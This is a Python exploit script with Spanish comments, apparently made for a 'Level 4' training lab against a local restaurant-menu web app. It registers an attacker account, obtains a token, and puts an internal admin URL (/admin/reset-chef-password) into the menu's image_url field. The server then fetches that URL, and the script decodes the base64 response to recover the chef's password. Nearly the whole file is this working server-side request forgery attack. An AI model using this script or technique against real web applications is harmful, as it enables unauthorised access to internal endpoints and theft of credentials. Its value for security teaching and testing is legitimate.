import time
import requests
import base64
import json

BASE_URL = "http://localhost:8091"

# ============= CONFIGURACIÃ“N DEL USUARIO DE PRUEBA =============
TEST_USER = {
    "username": "lvl4_video_2",
    "password": "attack123",
    "phone_number": "455665561447",
    "first_name": "Level4",
    "last_name": "Attacker"
}

# URL objetivo del SSRF (endpoint interno de admin)
SSRF_TARGET = "http://localhost:8091/admin/reset-chef-password"

# ============= FUNCIONES AUXILIARES =============
def slow_print(msg, delay=0.5):
    """Imprime mensaje con delay para visualizar el proceso"""
    print(msg)
    time.sleep(delay)

def separator(title=""):
    """Imprime separador visual"""
    print("\n" + "="*70)
    if title:
        print(f"  {title}")
        print("="*70)
    print()

def decode_base64(encoded_str):
    """Decodifica string en base64"""
    try:
        decoded_bytes = base64.b64decode(encoded_str)
        decoded_str = decoded_bytes.decode('utf-8')
        return decoded_str
    except Exception as e:
        return f"Error decodificando: {str(e)}"

# ============= FUNCIONES DE API =============
def register_user(user_data):
    """Registra un nuevo usuario"""
    slow_print(f"ðŸ“ Registrando usuario atacante: {user_data['username']}")
    
    payload = {
        "username": user_data["username"],
        "password": user_data["password"],
        "phone_number": user_data["phone_number"],
        "first_name": user_data["first_name"],
        "last_name": user_data["last_name"]
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/register",
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        slow_print(f"âœ… Respuesta [{r.status_code}]: {r.text}")
        
        if r.status_code == 200 or r.status_code == 201:
            slow_print(f"âœ… Usuario '{user_data['username']}' creado exitosamente\n")
            return True
        else:
            slow_print(f"âš ï¸  Posible error en registro\n")
            return False
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n")
        return False

def get_token(username, password):
    """Obtiene token de autenticaciÃ³n"""
    slow_print(f"ðŸ”‘ Obteniendo token para: {username}")
    
    payload = {
        "username": username,
        "password": password
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/token",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        if r.status_code == 200:
            token_data = r.json()
            token = token_data.get("access_token")
            slow_print(f"âœ… Token obtenido: {token[:50]}...\n")
            return token
        else:
            slow_print(f"âŒ Error [{r.status_code}]: {r.text}\n")
            return None
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n")
        return None

def create_menu_with_ssrf(token, ssrf_url):
    """Crea un menÃº explotando SSRF en el campo image_url"""
    slow_print(f"ðŸ” Creando menÃº con payload SSRF...")
    slow_print(f"ðŸŽ¯ URL objetivo: {ssrf_url}")
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    # Payload malicioso - el image_url apunta a un endpoint interno
    payload = {
        "name": "Sandwich Cubano",
        "price": 12,
        "category": "explotion",
        "image_url": ssrf_url,  # ðŸš¨ SSRF AQUÃ
        "description": ""
    }
    
    slow_print(f"\nðŸ“¦ Payload enviado:")
    slow_print(f"   {json.dumps(payload, indent=2)}\n")
    
    try:
        r = requests.put(
            f"{BASE_URL}/menu",
            json=payload,
            headers=headers
        )
        
        slow_print(f"ðŸ“¡ Respuesta del servidor [{r.status_code}]:")
        slow_print(f"   {r.text}\n")
        
        if r.status_code == 201 or r.status_code == 200:
            slow_print(f"âœ… MenÃº creado exitosamente\n")
            
            try:
                response_data = r.json()
                return response_data
            except:
                slow_print(f"âš ï¸  Respuesta no es JSON vÃ¡lido\n")
                return None
        else:
            slow_print(f"âš ï¸  Estado de respuesta: {r.status_code}\n")
            return None
            
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n")
        return None

def extract_and_decode_password(response_data):
    """Extrae el image_base64 del response y lo decodifica"""
    slow_print("ðŸ” Buscando image_base64 en la respuesta...")
    
    if not response_data:
        slow_print("âŒ No hay datos de respuesta\n")
        return None
    
    # Buscar el campo image_base64
    image_base64 = response_data.get("image_base64")
    
    if not image_base64:
        slow_print("âŒ No se encontrÃ³ 'image_base64' en la respuesta")
        slow_print(f"   Campos disponibles: {list(response_data.keys())}\n")
        return None
    
    slow_print(f"âœ… image_base64 encontrado (primeros 50 chars):")
    slow_print(f"   {image_base64[:50]}...\n")
    
    slow_print("ðŸ”“ Decodificando base64 para obtener la contraseÃ±a...\n")
    
    decoded_password = decode_base64(image_base64)
    
    return decoded_password

# ============= SCRIPT PRINCIPAL - EXPLOIT LEVEL 4 =============
def main():
    separator("ðŸš¨ EXPLOIT LEVEL 4 - SSRF ATTACK (EjecuciÃ³n Lenta)")
    
    slow_print("ðŸ“‹ DescripciÃ³n del ataque:")
    slow_print("   Server-Side Request Forgery (SSRF)")
    slow_print("   Se explota el campo 'image_url' del menÃº para hacer")
    slow_print("   que el servidor realice una peticiÃ³n a un endpoint interno")
    slow_print("   y filtre informaciÃ³n sensible (contraseÃ±a del chef)\n")
    
    # ===== PASO 1: CREAR USUARIO ATACANTE =====
    separator("PASO 1: Crear usuario atacante")
    
    success = register_user(TEST_USER)
    if not success:
        slow_print("âŒ No se pudo crear el usuario. Abortando exploit.\n")
        return
    
    # ===== PASO 2: OBTENER TOKEN =====
    separator("PASO 2: Obtener token de autenticaciÃ³n")
    
    token = get_token(TEST_USER["username"], TEST_USER["password"])
    if not token:
        slow_print("âŒ No se pudo obtener el token. Abortando exploit.\n")
        return
    
    # ===== PASO 3: EJECUTAR ATAQUE SSRF =====
    separator("PASO 3: Ejecutar ataque SSRF")
    
    slow_print("âš ï¸  Intentando hacer que el servidor acceda a un endpoint interno...")
    slow_print("   Endpoint objetivo: /admin/reset-chef-password\n")
    
    response_data = create_menu_with_ssrf(token, SSRF_TARGET)
    
    # ===== PASO 4: EXTRAER Y DECODIFICAR CONTRASEÃ‘A =====
    separator("PASO 4: Extraer informaciÃ³n filtrada")
    
    if response_data:
        decoded_password = extract_and_decode_password(response_data)
        
        if decoded_password:
            separator("ðŸŽ‰ Â¡ATAQUE EXITOSO!")
            slow_print("ðŸ” CONTRASEÃ‘A DEL CHEF OBTENIDA:")
            slow_print(f"\n   >>> {decoded_password} <<<\n")
            slow_print("="*70)
            
            slow_print("\nðŸ“Š RESUMEN DEL EXPLOIT:")
            slow_print(f"   Usuario atacante: {TEST_USER['username']}")
            slow_print(f"   Endpoint explotado: PUT /menu")
            slow_print(f"   Vulnerabilidad: SSRF en campo 'image_url'")
            slow_print(f"   InformaciÃ³n filtrada: ContraseÃ±a del chef")
            slow_print(f"   ContraseÃ±a: {decoded_password}")
            print()
        else:
            slow_print("\nâš ï¸  No se pudo decodificar la contraseÃ±a")
            slow_print("   Posiblemente el servidor estÃ¡ protegido contra SSRF\n")
    else:
        slow_print("\nâš ï¸  El ataque  no funcionÃ³")
        
    
    separator("âœ… FIN DEL EXPLOIT LEVEL 4")
    
    slow_print(f"ðŸ’¡ Token usado: {token[:50]}...\n")

if __name__ == "__main__":
    main()